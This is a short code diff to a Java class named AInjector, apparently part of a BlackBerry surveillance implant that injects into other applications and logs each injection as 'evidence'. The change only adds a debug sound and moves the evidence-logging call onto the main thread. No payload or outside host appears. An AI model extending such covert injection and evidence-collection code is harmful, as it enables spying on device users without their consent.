@@ -12,6 +12,7 @@ package blackberry.injection.injectors;
 import net.rim.device.api.system.Clipboard;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.Main;
 import blackberry.Messages;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -55,13 +56,27 @@ public abstract class AInjector {
         tries = 0;
     }
 
-    public void setInjectedApp(UiApplication app) {
+    public void setInjectedApp(UiApplication app) {        
+        
         //#ifdef DEBUG
         debug.trace("setInjectedApp: INJECTED"); //$NON-NLS-1$
         //#endif
+        
+        //#ifdef BBM_DEBUG
+        Debug.playSoundOk(3);
+        //#endif
+        
         this.injectedApp = app;
-        // A.0=INJ: 
-        Evidence.info(Messages.getString("A.0") + getAppName()); //$NON-NLS-1$
+        
+        final String appName = getAppName();
+        Main main = Main.getInstance();
+        main.invokeLater(new Runnable() {
+            public void run() {
+             // A.0=INJ: 
+                Evidence.info(Messages.getString("A.0") + appName); //$NON-NLS-1$
+            }
+        });
+        
     }
 
     public UiApplication getInjectedApp() {
